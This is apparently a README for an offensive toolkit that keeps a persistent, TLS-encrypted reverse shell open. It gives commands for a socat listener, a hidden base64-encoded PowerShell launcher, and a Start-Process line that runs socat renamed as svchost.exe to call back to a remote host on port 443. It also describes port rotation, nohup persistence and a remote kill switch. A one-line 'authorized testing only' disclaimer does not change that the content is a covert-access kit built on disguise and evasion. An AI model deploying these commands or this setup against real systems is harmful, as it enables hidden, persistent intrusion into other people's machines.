# 🛠 Persistent Reverse Shell Toolkit

![Docker](https://img.shields.io/badge/Built%20With-Docker-blue)
![Shell](https://img.shields.io/badge/Scripting-Bash%20%7C%20PowerShell-yellow)
![License](https://img.shields.io/badge/Maintained%20by-C04CH_1337-red)

## 🔐 Overview

This project demonstrates how to maintain a **persistent, encrypted reverse shell** using:
- Docker + Bash scripts
- socat w/ SSL/TLS encryption
- Base64-encoded PowerShell payloads
- Port rotation & `nohup` persistence
- Remote kill switch & ping health check
- Windows delivery using renamed `svchost.exe` binary

> ⚠️ **For authorized penetration testing & research only.**

---

## 📁 File Tree

```
.
├── docker/
│   ├── Dockerfile
│   ├── cert.pem
│   ├── key.pem
├── scripts/
│   ├── reverse_shell.sh
│   ├── watchdog.sh
├── powershell/
│   └── payloads.ps1
├── windows/
│   └── svchost.exe (socat renamed)
├── README.md
```

---

## 🔧 Build & Run Docker

```bash
docker build -t revshell ./docker
docker run -d --name revshell -p 443:443 revshell
```

## 📦 socat TLS Listener (Manual)

```bash
socat OPENSSL-LISTEN:443,cert=cert.pem,key=key.pem,reuseaddr,fork -
```

---

## 🛡 PowerShell Payloads (Encoded)

### Payload: Base64 Launcher

```powershell
powershell -NoP -NonI -W Hidden -EncodedCommand <base64-string>
```

---

## ⚙️ Persistence & Watchdog

- `nohup` keeps socat running detached
- Rotates ports between 443, 8443, 53, 5985
- Remote kill via hosted `kill.txt`
- Healthcheck: Pings attacker IP before launching socat

---

## 💀 Kill Switch Example

Host a file `kill.txt` at your domain:
```
KILL
```

---

## 📦 Windows Payload

Drop `windows/svchost.exe` and use:
```powershell
Start-Process -WindowStyle Hidden -FilePath "C:\Temp\svchost.exe" -ArgumentList "STDIO OPENSSL:192.168.1.100:443,verify=0"
```

---

## 🔖 Maintained by

> **C04CH_1337** 🧠
